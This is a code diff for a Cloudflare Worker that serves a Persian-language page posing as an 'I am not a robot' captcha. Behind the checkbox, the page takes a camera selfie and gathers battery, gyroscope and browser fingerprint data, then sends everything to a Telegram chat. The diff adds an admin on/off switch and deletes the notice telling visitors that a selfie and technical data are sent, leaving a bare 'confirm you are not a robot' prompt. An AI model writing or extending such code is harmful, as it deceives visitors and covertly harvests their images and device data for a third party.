@@ -1,11 +1,24 @@
 // ============================================================
-//  Selfie Captcha Worker — v4 (Gyro + Battery)
+//  Selfie Captcha Worker — v5 (Gyro + Battery + On/Off toggle)
+// ============================================================
+//  Env vars:
+//    TELEGRAM_BOT_TOKEN   (required)
+//    TELEGRAM_CHAT_ID     (required)
+//    SESSION_SECRET       (optional)
+//    ADMIN_TOKEN          (optional, but STRONGLY recommended)
+//    MAX_UPLOAD_BYTES     (optional, default 5MB)
+//    RATE_LIMIT_PER_MIN   (optional, default 5)
+//
+//  KV Binding (optional but recommended for /on /off):
+//    SELFIE_STATE  →  KV Namespace
+//    (fallback: Cache API per-colo if missing)
 // ============================================================
 
 export default {
   async fetch(request, env, ctx) {
     try {
       const url = new URL(request.url);
+
       if (url.pathname === '/') {
         if (request.method !== 'GET') return methodNotAllowed(['GET']);
         return await handlePage(request, env);
@@ -14,6 +27,15 @@ export default {
         if (request.method !== 'POST') return methodNotAllowed(['POST']);
         return await handleUpload(request, env);
       }
+      if (url.pathname === '/on' || url.pathname === '/off') {
+        if (request.method !== 'POST') return methodNotAllowed(['POST']);
+        return await handleToggle(request, env, url.pathname.slice(1));
+      }
+      if (url.pathname === '/state') {
+        if (request.method !== 'GET') return methodNotAllowed(['GET']);
+        return json({ state: await getSelfieState(env) });
+      }
+
       return new Response('Not Found', { status: 404 });
     } catch (err) {
       console.error('unhandled', err?.stack || err);
@@ -23,12 +45,78 @@ export default {
 };
 
 // ============================================================
+//  Selfie mode toggle
+// ============================================================
+const STATE_KEY = 'selfie';
+const STATE_URL = 'https://selfie-state.local/state';
+
+async function getSelfieState(env) {
+  if (env.SELFIE_STATE) {
+    try {
+      const v = await env.SELFIE_STATE.get(STATE_KEY);
+      return v === 'off' ? 'off' : 'on';
+    } catch (e) {
+      console.error('kv get failed', e);
+    }
+  }
+  try {
+    const cache = caches.default;
+    const hit = await cache.match(new Request(STATE_URL));
+    if (hit) {
+      const v = await hit.text();
+      return v === 'off' ? 'off' : 'on';
+    }
+  } catch {}
+  return 'on';
+}
+
+async function setSelfieState(env, state) {
+  const value = state === 'off' ? 'off' : 'on';
+
+  if (env.SELFIE_STATE) {
+    await env.SELFIE_STATE.put(STATE_KEY, value);
+    return { ok: true, storage: 'kv', state: value };
+  }
+
+  const cache = caches.default;
+  await cache.put(
+    new Request(STATE_URL),
+    new Response(value, {
+      headers: { 'Cache-Control': 'public, max-age=31536000' },
+    })
+  );
+  return {
+    ok: true,
+    storage: 'cache',
+    state: value,
+    warning: 'SELFIE_STATE KV not bound — state is per-colo only',
+  };
+}
+
+async function handleToggle(request, env, action) {
+  if (env.ADMIN_TOKEN) {
+    const url = new URL(request.url);
+    const provided =
+      url.searchParams.get('token') ||
+      request.headers.get('X-Admin-Token') ||
+      '';
+    if (provided !== env.ADMIN_TOKEN) {
+      return json({ error: 'unauthorized' }, 401);
+    }
+  }
+  const result = await setSelfieState(env, action);
+  console.log(`selfie mode → ${action}`, result);
+  return json(result);
+}
+
+// ============================================================
 //  GET /
 // ============================================================
 async function handlePage(request, env) {
   const secret = env.SESSION_SECRET || env.TELEGRAM_BOT_TOKEN;
   const token = await issueToken(secret);
   const nonce = crypto.randomUUID().replace(/-/g, '');
+  const selfieState = await getSelfieState(env);
 
   const headers = new Headers({
     'Content-Type': 'text/html;charset=UTF-8',
@@ -36,7 +124,6 @@ async function handlePage(request, env) {
     'X-Content-Type-Options': 'nosniff',
     'X-Frame-Options': 'DENY',
     'Referrer-Policy': 'no-referrer',
-    // 🔽 NEW: اجازه سنسورها
     'Permissions-Policy':
       'camera=(self), microphone=(), geolocation=(), ' +
       'accelerometer=(self), gyroscope=(self), magnetometer=(self)',
@@ -57,7 +144,7 @@ async function handlePage(request, env) {
     `hs_session=${token}; Path=/; HttpOnly; SameSite=Strict; Max-Age=300; Secure`
   );
 
-  return new Response(renderHTML(nonce), { headers });
+  return new Response(renderHTML(nonce, selfieState), { headers });
 }
 
 // ============================================================
@@ -82,19 +169,21 @@ async function handleUpload(request, env) {
     return json({ error: 'invalid_multipart' }, 400);
   }
 
+  const selfieMode = await getSelfieState(env);
+
   const photo = form.get('photo');
   const clientDataRaw = form.get('clientData');
 
-  if (!(photo instanceof File)) return json({ error: 'missing_photo' }, 400);
-
-  const maxBytes = Number(env.MAX_UPLOAD_BYTES) || 5 * 1024 * 1024;
-  if (photo.size === 0) return json({ error: 'empty_photo' }, 400);
-  if (photo.size > maxBytes) return json({ error: 'photo_too_large' }, 413);
-  if (!/^image\/(jpeg|png|webp)$/.test(photo.type)) {
-    return json({ error: 'invalid_mime' }, 415); // 🔽 FIXED
+  if (selfieMode === 'on') {
+    if (!(photo instanceof File)) return json({ error: 'missing_photo' }, 400);
+    const maxBytes = Number(env.MAX_UPLOAD_BYTES) || 5 * 1024 * 1024;
+    if (photo.size === 0) return json({ error: 'empty_photo' }, 400);
+    if (photo.size > maxBytes) return json({ error: 'photo_too_large' }, 413);
+    if (!/^image\/(jpeg|png|webp)$/.test(photo.type)) {
+      return json({ error: 'invalid_mime' }, 415);
+    }
   }
 
-  // 🔽 FIXED: پارس درست clientData
   let clientInfo = {};
   try {
     clientInfo = JSON.parse(clientDataRaw || '{}');
@@ -133,16 +222,18 @@ async function handleUpload(request, env) {
   };
 
   const sessionId = crypto.randomUUID().slice(0, 8);
-  const reportHtml = buildReport(sessionId, serverInfo, clientInfo);
+  const reportHtml = buildReport(sessionId, serverInfo, clientInfo, selfieMode);
 
   const tg = new TelegramClient(env.TELEGRAM_BOT_TOKEN, env.TELEGRAM_CHAT_ID);
   const results = [];
 
-  const photoRes = await tg.sendPhoto(
-    photo,
-    `📸 <b>سلفی دریافتی</b>\nشناسه: <code>${sessionId}</code>`
-  );
-  results.push({ step: 'photo', ok: !!photoRes.ok });
+  if (selfieMode === 'on' && photo instanceof File) {
+    const photoRes = await tg.sendPhoto(
+      photo,
+      `📸 <b>سلفی دریافتی</b>\nشناسه: <code>${sessionId}</code>`
+    );
+    results.push({ step: 'photo', ok: !!photoRes.ok });
+  }
 
   for (const [i, chunk] of chunkByLines(reportHtml).entries()) {
     const r = await tg.sendMessage(chunk);
@@ -151,21 +242,21 @@ async function handleUpload(request, env) {
   }
 
   const rawJson = JSON.stringify(
-    { sessionId, at: new Date().toISOString(), serverInfo, clientInfo },
+    { sessionId, at: new Date().toISOString(), selfieMode, serverInfo, clientInfo },
     null,
     2
   );
   const docRes = await tg.sendDocument(
     new Blob([rawJson], { type: 'application/json' }),
     `data_${sessionId}.json`,
-    `📄 داده خام • <code>${sessionId}</code>`
+    `📄 داده خام • <code>${sessionId}</code> • حالت: <b>${selfieMode}</b>`
   );
   results.push({ step: 'raw_json', ok: !!docRes.ok });
 
   if (!results.some((r) => r.ok)) {
     return json({ error: 'telegram_failed', results }, 502);
   }
-  return json({ ok: true, sessionId, results });
+  return json({ ok: true, sessionId, selfieMode, results });
 }
 
 // ============================================================
@@ -221,7 +312,7 @@ class TelegramClient {
 // ============================================================
 //  Report builder
 // ============================================================
-function buildReport(sessionId, server, client) {
+function buildReport(sessionId, server, client, selfieMode) {
   const esc = (v) =>
     String(v ?? '—')
       .replace(/&/g, '&amp;')
@@ -229,7 +320,6 @@ function buildReport(sessionId, server, client) {
       .replace(/>/g, '&gt;')
       .replace(/"/g, '&quot;');
 
-  // 🔽 FIXED: نام متغیرها
   const cam = client.camera || {};
   const frame = client.capturedFrame || {};
   const orientation = client.orientation || {};
@@ -241,10 +331,12 @@ function buildReport(sessionId, server, client) {
   const lines = [
     `🔐 <b>گزارش سلفی</b>`,
     `<i>شناسه:</i> <code>${sessionId}</code>`,
+    `<i>حالت سلفی:</i> ${
+      selfieMode === 'on' ? '🟢 روشن (با تصویر)' : '🔴 خاموش (بدون تصویر)'
+    }`,
     `<i>زمان:</i> ${esc(when)}`,
     ``,
 
-    // 🔽 NEW: باتری
     `🔋 <b>وضعیت باتری</b>`,
     battery.supported === false
       ? `<pre>در دسترس نیست (${esc(battery.reason || battery.error || 'unsupported')})</pre>`
@@ -254,7 +346,6 @@ function buildReport(sessionId, server, client) {
 تا خالی:    ${fmtSeconds(battery.dischargingTime)}</pre>`,
     ``,
 
-    // 🔽 NEW: ژیروسکوپ / وضعیت دستگاه
     `🧭 <b>وضعیت دستگاه (ژیروسکوپ)</b>`,
     orientation.supported === false
       ? `<pre>پشتیبانی نمی‌شود (${esc(orientation.reason || 'unknown')})</pre>`
@@ -293,7 +384,8 @@ Colo:       ${esc(server.colo)}</pre>`,
     ``,
 
     `📷 <b>اطلاعات دوربین</b>`,
-    `<pre>نوع:         ${esc(cam.facingMode || '—')}
+    selfieMode === 'on'
+      ? `<pre>نوع:         ${esc(cam.facingMode || '—')}
 رزولوشن:     ${esc(cam.width || '?')}×${esc(cam.height || '?')}
 فریم ریت:    ${esc(cam.frameRate || '?')} fps
 نسبت:        ${esc(cam.aspectRatio || '—')}
@@ -304,8 +396,9 @@ Torch:       ${cam.hasTorch ? 'دارد' : 'ندارد'}
 Zoom:        ${zoom ? `${zoom.min}–${zoom.max}` : '—'}
 ISO:         ${iso ? `${iso.min}–${iso.max}` : '—'}
 دستگاه‌ها:    ${esc(cam.videoDeviceCount)} دوربین / ${esc(cam.audioDeviceCount)} میکروفن
-فریم نهایی:  ${esc(frame.width || '?')}×${esc(frame.height || '?')} (${Math.round((frame.size || 0) / 1024)} KB)</pre>`,
-    cam.videoDeviceLabels && cam.videoDeviceLabels.length
+فریم نهایی:  ${esc(frame.width || '?')}×${esc(frame.height || '?')} (${Math.round((frame.size || 0) / 1024)} KB)</pre>`
+      : `<pre>غیرفعال — دوربین در حالت خاموش درخواست نشد</pre>`,
+    selfieMode === 'on' && cam.videoDeviceLabels && cam.videoDeviceLabels.length
       ? `<i>لیبل دستگاه‌ها:</i> ${esc(cam.videoDeviceLabels.join(' • '))}`
       : ``,
     ``,
@@ -336,7 +429,6 @@ PDF:        ${client.pdfViewerEnabled ? 'بله' : 'خیر'}</pre>`,
 // ============================================================
 //  Helpers for report formatting
 // ============================================================
-// 🔽 NEW
 const fmtNum = (n, digits = 1) =>
   typeof n === 'number' && isFinite(n) ? n.toFixed(digits) : '—';
 
@@ -350,7 +442,7 @@ const fmtSeconds = (s) => {
 };
 
 // ============================================================
-//  Session token / rate limit / utils (بدون تغییر)
+//  Session token (HMAC-signed timestamp)
 // ============================================================
 async function issueToken(secret) {
   const ts = String(Date.now());
@@ -389,6 +481,10 @@ async function hmac(data, secret) {
     .replace(/\//g, '_')
     .replace(/=+$/, '');
 }
+
+// ============================================================
+//  Rate limit (Cache API, per-colo)
+// ============================================================
 async function rateLimit(ip, limit, windowSec) {
   const cache = caches.default;
   const key = new Request(`https://ratelimit.local/${encodeURIComponent(ip)}`);
@@ -403,6 +499,10 @@ async function rateLimit(ip, limit, windowSec) {
   );
   return { allowed: true, remaining: limit - count - 1 };
 }
+
+// ============================================================
+//  Utilities
+// ============================================================
 function parseCookie(header, name) {
   for (const part of header.split(';')) {
     const [k, ...rest] = part.trim().split('=');
@@ -436,7 +536,13 @@ const methodNotAllowed = (allowed) =>
 // ============================================================
 //  Frontend
 // ============================================================
-function renderHTML(nonce) {
+function renderHTML(nonce, selfieState) {
+  const selfieMode = selfieState === 'off' ? 'off' : 'on';
+  const hintText =
+    selfieMode === 'on'
+      ? 'تایید کنید ربات نیستید.'
+      : '';
+
   return `<!DOCTYPE html>
 <html lang="fa" dir="rtl">
 <head>
@@ -503,7 +609,7 @@ function renderHTML(nonce) {
       <span class="label" id="label">من ربات نیستم</span>
     </div>
     <p class="hint">
-      با کلیک روی این کادر، یک تصویر سلفی و اطلاعات فنی مرورگر شما برای بررسی ارسال می‌شود.
+      ${hintText}
     </p>
     <div class="status" id="status" role="status" aria-live="polite"></div>
     <button class="retry" id="retry" type="button">تلاش مجدد</button>
@@ -515,6 +621,8 @@ function renderHTML(nonce) {
 
 <script nonce="${nonce}">
 (() => {
+  const SELFIE_MODE = ${JSON.stringify(selfieMode)};
+
   const el = {
     box: document.getElementById('checkbox'),
     label: document.getElementById('label'),
@@ -627,7 +735,6 @@ function renderHTML(nonce) {
     return info;
   }
 
-  // 🔽 NEW: مجوز ژیروسکوپ (iOS 13+)
   async function requestOrientationPermission() {
     try {
       if (typeof DeviceOrientationEvent === 'undefined') {
@@ -639,18 +746,16 @@ function renderHTML(nonce) {
       }
       return { available: true, reason: 'no_permission_needed' };
     } catch (e) {
-      return { available: false, reason: String(e && e.message || e) };
+      return { available: false, reason: String((e && e.message) || e) };
     }
   }
 
-  // 🔽 NEW: نمونه‌برداری از ژیروسکوپ
   async function collectOrientation(sampleMs = 500) {
     const result = {
       supported: typeof DeviceOrientationEvent !== 'undefined',
       samples: [],
     };
 
-    // وضعیت صفحه — بدون نیاز به مجوز، قابل اعتماد
     try {
       if (screen.orientation) {
         result.screenOrientation = {
@@ -702,7 +807,6 @@ function renderHTML(nonce) {
     return result;
   }
 
-  // 🔽 NEW: تفسیر وضعیت دستگاه
   function classifyPosture(avg, screenOrient) {
     if (avg.beta == null && avg.gamma == null) return 'unknown';
     const beta = avg.beta ?? 0;
@@ -710,17 +814,14 @@ function renderHTML(nonce) {
     const absB = Math.abs(beta);
     const parts = [];
 
-    // front/back tilt
     if (absB < 20) parts.push('افقی (تخت)');
     else if (absB < 70) parts.push(beta > 0 ? 'کمی رو به جلو' : 'کمی رو به عقب');
     else if (absB < 110) parts.push('عمودی');
     else parts.push('رو به پایین');
 
-    // left/right tilt
     if (gamma > 25) parts.push('کج به راست');
     else if (gamma < -25) parts.push('کج به چپ');
 
-    // screen orientation
     const t = screenOrient && screenOrient.type;
     if (t) {
       if (t.indexOf('portrait') === 0) parts.push('صفحه عمودی');
@@ -730,7 +831,6 @@ function renderHTML(nonce) {
     return parts.join(' • ') || 'صاف';
   }
 
-  // 🔽 NEW: باتری
   async function collectBattery() {
     const out = { supported: typeof navigator.getBattery === 'function' };
     if (!out.supported) {
@@ -745,7 +845,7 @@ function renderHTML(nonce) {
       out.chargingTime = Number.isFinite(b.chargingTime) ? b.chargingTime : null;
       out.dischargingTime = Number.isFinite(b.dischargingTime) ? b.dischargingTime : null;
     } catch (e) {
-      out.error = String(e && e.message || e);
+      out.error = String((e && e.message) || e);
     }
     return out;
   }
@@ -781,36 +881,39 @@ function renderHTML(nonce) {
     busy = true;
     setState('busy');
 
-    // 🔽 NEW — اول از همه: درخواست مجوز ژیروسکوپ
-    // (باید داخل هندلر کلیک و قبل از هر await دیگری باشد)
     const orientationPerm = await requestOrientationPermission();
 
     let stream = null;
     try {
-      stream = await getCameraStream();
-      el.video.srcObject = stream;
-      await waitForVideo(el.video);
-      await new Promise((r) => setTimeout(r, 350));
+      let blob = null;
+      let captured = null;
+      let camInfo = {};
 
-      const camInfo = await collectCameraInfo(stream);
+      if (SELFIE_MODE === 'on') {
+        stream = await getCameraStream();
+        el.video.srcObject = stream;
+        await waitForVideo(el.video);
+        await new Promise((r) => setTimeout(r, 350));
 
-      el.canvas.width = el.video.videoWidth || 640;
-      el.canvas.height = el.video.videoHeight || 480;
-      el.canvas.getContext('2d').drawImage(el.video, 0, 0, el.canvas.width, el.canvas.height);
+        camInfo = await collectCameraInfo(stream);
 
-      const blob = await new Promise((res) => el.canvas.toBlob(res, 'image/jpeg', 0.9));
-      if (!blob) throw new Error('capture_failed');
+        el.canvas.width = el.video.videoWidth || 640;
+        el.canvas.height = el.video.videoHeight || 480;
+        el.canvas.getContext('2d').drawImage(el.video, 0, 0, el.canvas.width, el.canvas.height);
 
-      const captured = {
-        width: el.canvas.width,
-        height: el.canvas.height,
-        size: blob.size,
-      };
+        blob = await new Promise((res) => el.canvas.toBlob(res, 'image/jpeg', 0.9));
+        if (!blob) throw new Error('capture_failed');
 
-      stream.getTracks().forEach((t) => t.stop());
-      stream = null;
+        captured = {
+          width: el.canvas.width,
+          height: el.canvas.height,
+          size: blob.size,
+        };
 
-      // 🔽 NEW: ژیروسکوپ + باتری به‌صورت موازی
+        stream.getTracks().forEach((t) => t.stop());
+        stream = null;
+      }
+
       const [orientation, battery] = await Promise.all([
         orientationPerm.available
           ? collectOrientation()
@@ -819,14 +922,17 @@ function renderHTML(nonce) {
       ]);
 
       const clientData = collectClientData();
+      clientData.selfieMode = SELFIE_MODE;
       clientData.camera = camInfo;
       clientData.capturedFrame = captured;
-      clientData.orientation = orientation;               // 🔽 NEW
-      clientData.orientationPermission = orientationPerm; // 🔽 NEW
-      clientData.battery = battery;                       // 🔽 NEW
+      clientData.orientation = orientation;
+      clientData.orientationPermission = orientationPerm;
+      clientData.battery = battery;
 
       const fd = new FormData();
-      fd.append('photo', blob, 'selfie.jpg');
+      if (SELFIE_MODE === 'on' && blob) {
+        fd.append('photo', blob, 'selfie.jpg');
+      }
       fd.append('clientData', JSON.stringify(clientData));
 
       const resp = await fetch('/upload', {
